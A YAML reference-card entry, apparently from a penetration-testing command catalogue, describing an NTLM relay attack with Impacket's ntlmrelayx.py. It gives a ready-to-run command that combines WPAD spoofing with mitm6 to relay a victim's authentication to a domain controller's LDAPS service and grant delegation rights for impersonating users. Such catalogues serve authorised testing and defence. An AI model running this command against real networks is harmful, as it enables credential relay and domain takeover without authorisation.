---
description: |
  Impacket's ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols (SMB, HTTP, LDAP, etc.).

  The below command will perform WPAD spoofing to force the victim machine to authenticate to the attacker controlled host. The command will then relay the authentication to create a new computer object and grant it delegation rights to impersonate users on the victim machine. This command should be used in conjunction with mitm6.

  Command Reference:

  	Target Domain Controller: dc.test.local

command: |
  python3 ntlmrelayx.py -t ldaps://dc.test.local -wh test-wpad --delegate-access
items:
  - No_Creds
services:
  - NTLM
  - LDAP
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
  - https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
---
